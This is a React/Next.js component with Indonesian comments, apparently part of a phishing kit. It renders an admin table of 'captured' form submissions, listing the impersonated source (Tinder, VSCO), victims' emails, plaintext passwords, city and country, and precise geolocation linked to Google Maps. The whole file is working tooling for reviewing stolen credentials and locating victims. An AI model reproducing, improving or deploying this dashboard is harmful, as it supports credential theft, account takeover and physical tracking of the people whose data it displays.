'use client';

import { useState } from 'react';
import { CalendarIcon, MailIcon, LockIcon } from 'lucide-react';
import Link from 'next/link';
import { useRouter, usePathname, useSearchParams } from 'next/navigation';
import { Badge } from '@/components/ui/badge';
import { Card } from '@/components/ui/card';
import { MapPinIcon } from 'lucide-react';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import {
  Pagination,
  PaginationContent,
  PaginationItem,
  PaginationLink,
  PaginationNext,
  PaginationPrevious,
} from '@/components/ui/pagination';

interface GeolocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  timestamp: string;
}

interface FormCaptureItem {
  id: string;
  source: string;
  email?: string;
  password?: string;
  name?: string;
  phone?: string;
  city?: string;
  country?: string;
  shortcode?: string;
  created_at: number;
  formatted_date?: string;
  geolocation?: GeolocationData;
}

interface Meta {
  total: number;
  page: number;
  limit: number;
  totalPages: number;
}

interface FormCaptureTableProps {
  data: FormCaptureItem[];
  meta: Meta;
  isAdmin: boolean;
}

export default function FormCaptureTable({
  data,
  meta,
  isAdmin,
}: FormCaptureTableProps) {
  const router = useRouter();
  const pathname = usePathname();
  const searchParams = useSearchParams();

  // Fungsi untuk pergi ke halaman sesuai nomor halaman
  const goToPage = (page: number) => {
    const params = new URLSearchParams(searchParams.toString());
    params.set('page', page.toString());
    router.push(`${pathname}?${params.toString()}`);
  };

  // Fungsi untuk format tanggal
  const formatDate = (timestamp: number | string | undefined) => {
    if (!timestamp) return '-';

    try {
      let date;
      if (typeof timestamp === 'string') {
        if (timestamp.includes('T')) {
          // ISO string format
          date = new Date(timestamp);
        } else {
          // Unix timestamp as string
          date = new Date(parseInt(timestamp));
        }
      } else {
        // Unix timestamp as number
        date = new Date(timestamp);
      }

      return date.toLocaleString('id-ID', {
        day: 'numeric',
        month: 'long',
        year: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
      });
    } catch (error) {
      console.error('Error formatting date:', error);
      return '-';
    }
  };

  // Fungsi untuk mendapatkan label badge source
  const getSourceBadge = (source: string) => {
    switch (source?.toLowerCase()) {
      case 'tinder':
        return <Badge color='destructive'>{source}</Badge>;
      case 'vsco':
        return <Badge color='success'>{source}</Badge>;
      default:
        return <Badge color='dark'>{source}</Badge>;
    }
  };

  // Fungsi untuk mendapatkan koordinat Google Maps
  const getMapsLink = (geo: GeolocationData | undefined) => {
    if (!geo?.latitude || !geo?.longitude) return null;

    const mapsUrl = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
    return (
      <Link
        href={mapsUrl}
        target='_blank'
        rel='noopener noreferrer'
        className='flex items-center gap-1 text-blue-600 hover:underline'
      >
        <MapPinIcon size={16} /> {geo.latitude.toFixed(4)},{' '}
        {geo.longitude.toFixed(4)}
      </Link>
    );
  };

  // Render paginasi
  const renderPagination = () => {
    if (!meta || meta.totalPages <= 1) return null;

    return (
      <Pagination>
        <PaginationContent>
          {meta.page > 1 && (
            <PaginationItem>
              <PaginationPrevious onClick={() => goToPage(meta.page - 1)} />
            </PaginationItem>
          )}

          {/* Halaman pertama */}
          {meta.page > 2 && (
            <PaginationItem>
              <PaginationLink onClick={() => goToPage(1)}>1</PaginationLink>
            </PaginationItem>
          )}

          {/* Halaman saat ini */}
          <PaginationItem>
            <PaginationLink isActive>{meta.page}</PaginationLink>
          </PaginationItem>

          {/* Halaman terakhir */}
          {meta.page < meta.totalPages - 1 && (
            <PaginationItem>
              <PaginationLink onClick={() => goToPage(meta.totalPages)}>
                {meta.totalPages}
              </PaginationLink>
            </PaginationItem>
          )}

          {meta.page < meta.totalPages && (
            <PaginationItem>
              <PaginationNext onClick={() => goToPage(meta.page + 1)} />
            </PaginationItem>
          )}
        </PaginationContent>
      </Pagination>
    );
  };

  return (
    <Card className='mt-5'>
      <div className='p-6'>
        <div className='overflow-x-auto'>
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Source</TableHead>
                <TableHead>Email</TableHead>
                <TableHead>Password</TableHead>
                <TableHead>Lokasi</TableHead>
                <TableHead>Geolokasi</TableHead>
                <TableHead>Tanggal</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {data.length > 0 ? (
                data.map((item) => (
                  <TableRow key={item.id}>
                    <TableCell>{getSourceBadge(item.source)}</TableCell>
                    <TableCell>
                      {item.email ? (
                        <div className='flex items-center gap-1'>
                          <MailIcon size={16} />
                          {item.email}
                        </div>
                      ) : (
                        '-'
                      )}
                    </TableCell>
                    <TableCell>
                      {item.password ? (
                        <div className='flex items-center gap-1'>
                          <LockIcon size={16} />
                          {item.password}
                        </div>
                      ) : (
                        '-'
                      )}
                    </TableCell>
                    <TableCell>
                      {item.city || item.country ? (
                        <div>
                          {item.city && <span>{item.city}</span>}
                          {item.city && item.country && <span>, </span>}
                          {item.country && <span>{item.country}</span>}
                        </div>
                      ) : (
                        '-'
                      )}
                    </TableCell>
                    <TableCell>
                      {getMapsLink(item.geolocation) || '-'}
                    </TableCell>
                    <TableCell>
                      <div className='flex items-center gap-1'>
                        <CalendarIcon size={16} />
                        {item.formatted_date
                          ? formatDate(item.formatted_date)
                          : formatDate(item.created_at)}
                      </div>
                    </TableCell>
                  </TableRow>
                ))
              ) : (
                <TableRow>
                  <TableCell colSpan={6} className='py-4 text-center'>
                    Tidak ada data ditemukan
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </div>

        {/* Pagination */}
        <div className='mt-5 flex justify-center'>{renderPagination()}</div>
      </div>
    </Card>
  );
}
